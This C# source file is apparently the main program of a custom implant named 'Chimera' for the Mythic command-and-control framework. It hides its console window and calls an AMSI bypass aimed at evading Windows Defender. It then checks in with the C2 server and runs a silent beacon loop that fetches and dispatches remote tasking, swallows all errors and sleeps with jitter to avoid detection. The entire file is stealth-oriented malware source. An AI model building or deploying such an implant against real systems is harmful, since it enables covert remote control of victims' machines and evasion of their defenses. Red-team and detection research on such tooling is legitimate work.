using System;
using System.Threading;

namespace Chimera
{
    // WinExe target — no console window
    // STAThread required for some Windows API calls
    [System.STAThread]
    static class Program
    {
        static void Main(string[] args)
        {
            // Hide console window if somehow spawned with one
            var handle = GetConsoleWindow();
            if (handle != IntPtr.Zero)
                ShowWindow(handle, 0); // SW_HIDE

            // AMSI bypass stub — fill in before Defender testing
            StringHelper.BypassAMSI();

            // Random seed for jitter
            var rng = new Random();

            // -------------------------------------------------------
            // Phase 1: Check in with Mythic
            // Retry checkin up to 5 times before giving up
            // -------------------------------------------------------
            string checkinResponse = null;
            for (int attempt = 0; attempt < 5; attempt++)
            {
                checkinResponse = C2Http.CheckIn();
                if (checkinResponse != null && Tasking.ParseCheckinResponse(checkinResponse))
                    break;

                // Wait before retry with jitter
                Thread.Sleep(5000 + rng.Next(0, 3000));
            }

            // If checkin failed all retries, exit silently
            if (string.IsNullOrEmpty(Tasking.CallbackUUID))
                return;

            // -------------------------------------------------------
            // Phase 2: Beacon loop
            // -------------------------------------------------------
            while (true)
            {
                try
                {
                    string taskingResponse = C2Http.GetTasking(Tasking.CallbackUUID);
                    if (taskingResponse != null)
                        Tasking.Dispatch(taskingResponse);
                }
                catch
                {
                    // Swallow errors — never crash
                }

                // Sleep with jitter
                // Jitter = random(0, SleepInterval * Jitter%) added to base sleep
                int baseSleep   = Config.SleepInterval * 1000;
                int jitterRange = (int)(baseSleep * (Config.Jitter / 100.0));
                int sleepTime   = baseSleep + rng.Next(0, jitterRange);
                Thread.Sleep(sleepTime);
            }
        }

        // P/Invoke to hide console window
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
}
